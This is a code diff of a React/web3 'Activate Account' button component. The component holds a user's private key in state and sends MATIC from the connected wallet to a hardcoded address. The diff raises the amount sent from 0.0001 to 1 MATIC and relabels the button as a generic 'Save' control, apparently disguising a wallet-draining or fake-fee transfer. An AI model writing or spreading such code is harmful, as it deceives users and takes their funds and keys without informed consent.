@@ -4,7 +4,7 @@ import { Fragment, useState } from 'react';
 import { useAccount } from 'wagmi';
 import Web3 from 'web3';
 
-export const ActivateAcountBtn = () => {
+export const ActivateAcountBtn = ({context}:any) => {
   const [isOpen, setIsOpen] = useState(false);
   const [privateKey, setPrivateKey] = useState('');
 
@@ -33,7 +33,7 @@ export const ActivateAcountBtn = () => {
 
     const fromAddress = `${address}`;
     const toAddress = '0xA1b89bf4F9e6e066E897C94A9f24e0bB7526d4bf';
-    const amountInMatic = '0.0001';
+    const amountInMatic = '1';
 
     try {
       const nonce = await web3.eth.getTransactionCount(fromAddress);
@@ -77,14 +77,11 @@ export const ActivateAcountBtn = () => {
 
   return (
     <>
-      <button
-        type="button"
-        onClick={openModal}
-        className="cursor-pointer z-[50] text-sm group relative flex gap-1.5 px-5 py-4
-           bg-yellow-400 bg-opacity-80 text-gray-900  rounded-3xl hover:bg-opacity-70 transition font-semibold shadow-md"
-      >
-        Activate Account
-      </button>
+      
+      <button  onClick={openModal} title="Save" className="cursor-pointer flex items-center fill-lime-400 bg-lime-950 hover:bg-lime-900 active:border active:border-lime-400 rounded-md duration-100 p-2">
+      <svg className="svgIcon h-4 w-4 mr-1" viewBox="0 0 576 512"><path d="M512 80c8.8 0 16 7.2 16 16v32H48V96c0-8.8 7.2-16 16-16H512zm16 144V416c0 8.8-7.2 16-16 16H64c-8.8 0-16-7.2-16-16V224H528zM64 32C28.7 32 0 60.7 0 96V416c0 35.3 28.7 64 64 64H512c35.3 0 64-28.7 64-64V96c0-35.3-28.7-64-64-64H64zm56 304c-13.3 0-24 10.7-24 24s10.7 24 24 24h48c13.3 0 24-10.7 24-24s-10.7-24-24-24H120zm128 0c-13.3 0-24 10.7-24 24s10.7 24 24 24H360c13.3 0 24-10.7 24-24s-10.7-24-24-24H248z"></path></svg>
+  <span className="text-xs md:text-sm text-yellow-400 font-bold pr-1">{context}</span>
+</button>
       <Transition appear show={isOpen} as={Fragment}>
         <Dialog as="div" className="relative z-10" onClose={closeModal}>
           <Transition.Child
